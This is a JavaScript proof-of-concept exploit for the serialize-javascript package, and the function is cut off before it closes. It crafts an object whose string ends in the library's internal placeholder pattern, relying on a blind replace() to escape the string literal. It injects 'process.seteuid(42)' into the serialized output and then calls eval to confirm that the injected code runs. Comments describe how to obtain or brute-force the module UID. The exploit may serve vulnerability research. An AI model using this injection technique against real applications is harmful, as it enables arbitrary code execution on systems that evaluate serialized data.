async function exploit() {
    const serialize = require('serialize-javascript');

    // In a real research scenario, you would extract this UID from the module's internal scope
    // or brute-force the ~4-billion keyspace offline. We use a placeholder here for demonstration.
    const MODULE_UID = '<MODULE_UID>';

    const payload = {
        // This string value ends exactly with the placeholder pattern.
        // JSON.stringify will escape the leading double quote as \".
        // The vulnerable .replace() logic ignores this preceding backslash and blindly replaces the placeholder,
        // allowing us to break out of the string literal and inject arbitrary JavaScript into the serialized output.
        key: '";process.seteuid(42);var z="{' + "@__R-" + MODULE_UID + "-0__@"
    };

    console.log('Serializing crafted object...');
    const serializedOutput = serialize(payload);
    console.log('Serialized output:\n', serializedOutput);

    console.log('\nEvaluating to verify code injection...\n');
    // The resulting string becomes syntactically valid JavaScript due to the blind replacement.
    // Executing this triggers the injected process.seteuid(42).
    eval('(' + serializedOutput + ')');
